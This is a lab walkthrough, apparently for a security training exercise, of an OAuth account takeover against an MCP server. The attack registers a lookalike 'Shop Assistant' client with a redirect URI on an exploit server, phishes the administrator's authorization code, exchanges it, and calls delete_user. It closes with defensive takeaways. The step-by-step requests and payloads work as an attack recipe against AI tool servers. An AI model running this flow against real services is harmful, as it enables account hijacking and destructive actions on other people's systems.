---
layout: default
title: MCP OAuth Account Takeover via Dynamic Client Registration
permalink: /labs/mcp-oauth-account-takeover-dynamic-client-registration/
---

# MCP OAuth Account Takeover via Dynamic Client Registration

## Lab

**Name:** MCP OAuth account takeover via dynamic client registration
**Goal:** Obtain an access token for the administrator and delete `carlos` through `/mcp`.

## OAuth Metadata

An unauthenticated request to `/mcp` provides the OAuth protected-resource metadata location.

```http
POST /mcp
```

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer resource_metadata="<lab>/.well-known/oauth-protected-resource"
```

The protected-resource metadata identifies the authorization server. Its authorization metadata exposes:

- `authorization_endpoint`
- `token_endpoint`
- `registration_endpoint`
- PKCE method `S256`

## Register a Malicious Client

Use the dynamic registration endpoint to register a client with:

- `client_name: Shop Assistant`
- An attacker-controlled redirect URI on the exploit server
- Authorization-code grant
- No client secret

Example:

```json
{
  "redirect_uris": [
    "https://exploit-server-id.exploit-server.net/callback"
  ],
  "client_name": "Shop Assistant",
  "token_endpoint_auth_method": "none",
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}
```

The server returns a new `client_id`.

## Trigger the Administrator Authorization

The lab has two exploitable assumptions:

1. Dynamic registration accepts attacker-controlled redirect URIs.
2. Consent is determined by the client name rather than by a unique or approved client ID.

Generate a PKCE verifier and S256 challenge. Deliver the victim a link that starts authorization for the duplicate `Shop Assistant` client:

```text
/oauth/authorize
  ?client_id=<registered_client_id>
  &redirect_uri=<exploit_server_callback>
  &response_type=code
  &code_challenge=<pkce_challenge>
  &code_challenge_method=S256
  &state=<attacker_state>
```

When the administrator visits the exploit server, the authorization server redirects to the attacker callback with an authorization code.

## Exchange the Authorization Code

Because PKCE is required, exchange the stolen code using the verifier chosen by the attacker:

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&client_id=<registered_client_id>
&code=<stolen_authorization_code>
&redirect_uri=<exploit_server_callback>
&code_verifier=<original_pkce_verifier>
```

The response contains an administrator access token.

## Delete Carlos

Initialize `/mcp` with the administrator bearer token, then call `delete_user`:

```json
{
  "jsonrpc":"2.0",
  "id":3,
  "method":"tools/call",
  "params": {
    "name": "delete_user",
    "arguments": {
      "username": "carlos"
    }
  }
}
```

The response confirms:

```text
Deleted carlos
```

## Key Takeaways

- Redirect URIs must be strictly validated and tied to a registered client.
- Consent decisions must use the unique client identity, not only a display name.
- Dynamic registration must not permit a malicious client to impersonate an approved application.
- PKCE protects the authorization code exchange but does not prevent account takeover if the authorization flow itself is misbound.
